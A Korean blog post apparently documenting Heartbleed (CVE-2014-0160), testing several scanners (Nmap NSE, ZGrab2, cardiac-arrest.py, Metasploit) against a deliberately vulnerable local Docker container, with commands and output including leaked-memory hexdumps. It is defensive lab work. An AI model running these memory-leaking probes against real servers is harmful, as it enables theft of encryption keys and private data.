---
layout: post
title: "하트블리드(heartbleed) 취약점 조사"
categories: [보안취약점]
tags: [보안취약점, openssl, heartbleed]
toc: true
---

# 하트블리드 개요 
- 2014년 4월에 발견된 openssl 구현 버그
- `CVE-2014-0160` 로 지정되어 있다. 
- TLS 연결을 유지하는 heartbeat 통신 신호의 구현에 버그가 있어 발생한다. 
- 공격자는 실제로 보내는 heartbeat의 크기보다 큰 크기를 보냈다고 거짓으로 요청하면 서버는 큰 크기를 맞추기 위해 메모리에 있는 다른 정보까지 끌어와 응답해준다. 여기서 데이터 유출이 발생된다. 

# 스캐너
- 다양한 스캐너가 있다. 

## heartbleed-poc.py 파이썬 스크립트 
- 아래 git 저장소의 파이썬 스크립트를 사용한다. 
- https://github.com/sensepost/heartbleed-poc/

## ZGrab2
- ZGrab 스캐너의 하트블리드 체크기능을 사용한다. 
- https://github.com/zmap/zgrab2
- [ZGrab]({% post_url 2022-12-12-Zgrab사용법 %})

## Nmap NSE 스크립트
- https://github.com/sensepost/heartbleed-poc/blob/master/ssl-heartbleed.nse 를 다운로드 받는다. 

```
cp ssl-heartbleed.nse /usr/share/nmap/scripts/
nmap --script-updatedb 
```

## cardiac-arrest.py 파이썬 스크립트 
- https://gist.github.com/ah8r/10632982


## 메타스플로잇 모듈 
```sh
use auxiliary/scanner/ssl/openssl_heartbleed
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > show options

Module options (auxiliary/scanner/ssl/openssl_heartbleed):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   DUMPFILTER                         no        Pattern to filter leaked memory before storing
   LEAK_COUNT        1                yes       Number of times to leak memory per SCAN or DUMP invocation
   MAX_KEYTRIES      50               yes       Max tries to dump key
   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Met
                                                asploit
   RPORT             443              yes       The target port (TCP)
   STATUS_EVERY      5                yes       How many retries until key dump status
   THREADS           1                yes       The number of concurrent threads (max one per host)
   TLS_CALLBACK      None             yes       Protocol to use, "None" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, P
                                                OP3, FTP, POSTGRES)
   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)


Auxiliary action:

   Name  Description
   ----  -----------
   SCAN  Check hosts for vulnerability



View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssl/openssl_heartbleed) >
```

# POC
## 취약한 서버
다음을 커맨드로 준비했다. 

```sh
docker pull hmlio/vaas-cve-2014-0160
docker run -d -p 8443:443 hmlio/vaas-cve-2014-0160
```

### 접속테스트 
curl 테스트 결과. https:// 로 접속하라고 한다. 

```sh
curl localhost:8443

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
Reason: You're speaking plain HTTP to an SSL-enabled server port.<br />
Instead use the HTTPS scheme to access this URL, please.<br />
<blockquote>Hint: <a href="https://172.17.0.4/"><b>https://172.17.0.4/</b></a></blockquote></p>
<hr>
<address>Apache/2.2.22 (Debian) Server at 172.17.0.4 Port 443</address>
</body></html>
```

도커 컨테이너 IP주소로 접속한 결과. (-k 옵션은 TLS증명서 검증 에러를 무시하라는 옵션)
잘 동작한다. (참고로 curl https://localhost:8443 -k 로도 접속가능하다.)

```sh
curl https://172.17.0.4 -k

<html>
        <head>
                <style>
                        body, pre {
                                color: #7b7b7b;
                                font: 300 16px/25px "Roboto",Helvetica,Arial,sans-serif;
                        }
                </style>
        <meta name="generator" content="vi2html">
        </head>
        <body>
        </br>
This is a vulnerable web server for showcasing CVE 2014-0160, a.k.a. Heartbleed.</br>
</br>
Vulnerability as a Service, brought to you by <a href="https://hml.io/" target="_blank">https://hml.io/</a>.</br>
</br>
For further details please see <a href="https://github.com/hmlio/vaas-cve-2014-0160" target="_blank">https://github.com/hmlio/vaas-cve-2014-0160</a>.</br>
        </body>
</html>

```

### heartbleed-poc.py 파이썬 스크립트로 스캔
이번에는 socket.gaierror 예외가 발생했다. 로컬 호스트 주소는 체크를 못하는 것일까?

```sh
python heartbleed-poc.py https://172.17.0.4

Scanning https://172.17.0.4 on port 443
Connecting...
Traceback (most recent call last):
  File "heartbleed-poc.py", line 213, in <module>
    main()
  File "heartbleed-poc.py", line 210, in main
    check(args[0], opts.port, opts.file, opts.quiet, opts.starttls)
  File "heartbleed-poc.py", line 176, in check
    s = connect(host, port, quiet)
  File "heartbleed-poc.py", line 131, in connect
    s.connect((host, port))
  File "/usr/lib64/python2.7/socket.py", line 228, in meth
    return getattr(self._sock,name)(*args)
socket.gaierror: [Errno -2] Name or service not known
```

### ZGrab2로 스캔 
- 스캔대상을 도커 컨테이너 IP 주소를 지정하면 타임아웃에러가 발생한다. 

```sh
zgrab2 http --use-https --heartbleed -t 0 -f test_target.csv

INFO[0000] started grab at 2022-12-13T05:40:11Z
{"ip":"172.17.0.4","data":{"http":{"status":"connection-timeout","protocol":"http","result":{},"timestamp":"2022-12-13T05:40:11Z","error":"dial tcp \u003cnil\u003e-\u003e172.17.0.4:80: i/o timeout"}}}
INFO[0000] finished grab at 2022-12-13T05:40:11Z
{"statuses":{"http":{"successes":0,"failures":1}},"start":"2022-12-13T05:40:11Z","end":"2022-12-13T05:40:11Z","duration":"7.172554ms"}
```

- 스캔대상을 localhost로 변경하니까 제대로 스캔되었다. 
- 결과json파일을 보면 상당한 양의 정보를 확인할 수 있다. 
- 그 중에서 "heartbleed_vulnerable" 이라는 항목에 결과가 true / false 로 나타난다. 

```sh
zgrab2 http --heartbleed --use-https -p 8443 -f test_target.csv -o zgrab2-heartbleed-result.json
INFO[0000] started grab at 2022-12-14T04:20:36Z
INFO[0000] finished grab at 2022-12-14T04:20:36Z
{"statuses":{"http":{"successes":1,"failures":0}},"start":"2022-12-14T04:20:36Z","end":"2022-12-14T04:20:36Z","duration":"11.858824ms"}
```

### Nmap NSE 스크립트로 스캔
성공했다! 제대로(?) 취약한 상태라고 탐지되었다. 

```sh
nmap -script=ssl-heartbleed -p 443 172.17.0.4

Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-13 07:52 UTC
Nmap scan report for 172.17.0.4
Host is up (0.000054s latency).

PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed:
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://www.openssl.org/news/secadv_20140407.txt
|_      http://cvedetails.com/cve/2014-0160/
MAC Address: 생략 

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
```

### cardiac-arrest.py 파이썬 스크립트 스캔
- 제대로 취약점이 검출된다. 
- hexdump 도 보여준다. 
- -V TLSv1.2등으로 SSL/TLS 버전도 지정할 수 있다. 
- 이 스크립트가 가장 쓸만한 것 같다. 

```sh
 python cardiac-arrest.py -p 8443 localhost
[INFO] Testing: localhost (127.0.0.1)

[INFO] Connecting to 127.0.0.1:8443 using SSLv3
[FAIL] Heartbeat response was 16384 bytes instead of 3! 127.0.0.1:8443 is vulnerable over SSLv3
[INFO] Displaying response (lines consisting entirely of null bytes are removed):

  0000: 02 FF FF 08 03 00 53 48 73 F0 7C CA C1 D9 02 04  ......SHs.|.....
  0010: F2 1D 2D 49 F5 12 BF 40 1B 94 D9 93 E4 C4 F4 F0  ..-I...@........
  0020: D0 42 CD 44 A2 59 00 02 96 00 00 00 01 00 02 00  .B.D.Y..........
  0060: 1B 00 1C 00 1D 00 1E 00 1F 00 20 00 21 00 22 00  .......... .!.".
  0070: 23 00 24 00 25 00 26 00 27 00 28 00 29 00 2A 00  #.$.%.&.'.(.).*.
  0080: 2B 00 2C 00 2D 00 2E 00 2F 00 30 00 31 00 32 00  +.,.-.../.0.1.2.
  0090: 33 00 34 00 35 00 36 00 37 00 38 00 39 00 3A 00  3.4.5.6.7.8.9.:.
  00a0: 3B 00 3C 00 3D 00 3E 00 3F 00 40 00 41 00 42 00  ;.<.=.>.?.@.A.B.
  00b0: 43 00 44 00 45 00 46 00 60 00 61 00 62 00 63 00  C.D.E.F.`.a.b.c.
  00c0: 64 00 65 00 66 00 67 00 68 00 69 00 6A 00 6B 00  d.e.f.g.h.i.j.k.
  00d0: 6C 00 6D 00 80 00 81 00 82 00 83 00 84 00 85 00  l.m.............
  01a0: 20 C0 21 C0 22 C0 23 C0 24 C0 25 C0 26 C0 27 C0   .!.".#.$.%.&.'.
  01b0: 28 C0 29 C0 2A C0 2B C0 2C C0 2D C0 2E C0 2F C0  (.).*.+.,.-.../.
  01c0: 30 C0 31 C0 32 C0 33 C0 34 C0 35 C0 36 C0 37 C0  0.1.2.3.4.5.6.7.
  01d0: 38 C0 39 C0 3A C0 3B C0 3C C0 3D C0 3E C0 3F C0  8.9.:.;.<.=.>.?.
  01e0: 40 C0 41 C0 42 C0 43 C0 44 C0 45 C0 46 C0 47 C0  @.A.B.C.D.E.F.G.
  01f0: 48 C0 49 C0 4A C0 4B C0 4C C0 4D C0 4E C0 4F C0  H.I.J.K.L.M.N.O.
  0200: 50 C0 51 C0 52 C0 53 C0 54 C0 55 C0 56 C0 57 C0  P.Q.R.S.T.U.V.W.
  0210: 58 C0 59 C0 5A C0 5B C0 5C C0 5D C0 5E C0 5F C0  X.Y.Z.[.\.].^._.
  0220: 60 C0 61 C0 62 C0 63 C0 64 C0 65 C0 66 C0 67 C0  `.a.b.c.d.e.f.g.
  0230: 68 C0 69 C0 6A C0 6B C0 6C C0 6D C0 6E C0 6F C0  h.i.j.k.l.m.n.o.
  0240: 70 C0 71 C0 72 C0 73 C0 74 C0 75 C0 76 C0 77 C0  p.q.r.s.t.u.v.w.
  0250: 78 C0 79 C0 7A C0 7B C0 7C C0 7D C0 7E C0 7F C0  x.y.z.{.|.}.~...
  02c0: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  02d0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  0300: 10 00 11 00 23 00 00 00 0F 00 01 01 8B 00 8A 00  ....#...........
  0310: 25 C0 2A 00 7E 00 3C 00 79 00 78 C0 13 00 6D 00  %.*.~.<.y.x...m.
  0320: 6C 00 6B 00 69 00 65 C0 97 00 55 00 51 00 03 00  l.k.i.e...U.Q...
  0330: 4E 00 4A 00 1F 00 3F 00 3E 00 39 C0 95 00 2D 00  N.J...?.>.9...-.
  0340: 24 00 13 01 00 00 15 00 0F 00 01 01 00 0A 00 0C  $...............
```

### 메타스플로잇 프레임워크 스캔 
탐지 성공했다. 잘 찾아준다. 

```sh
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set rhosts localhost
rhosts => localhost
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set rport 8443
rport => 8443
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > exploit

[+] 127.0.0.1:8443        - Heartbeat response with leak, 65535 bytes
[*] localhost:8443        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssl/openssl_heartbleed) >
```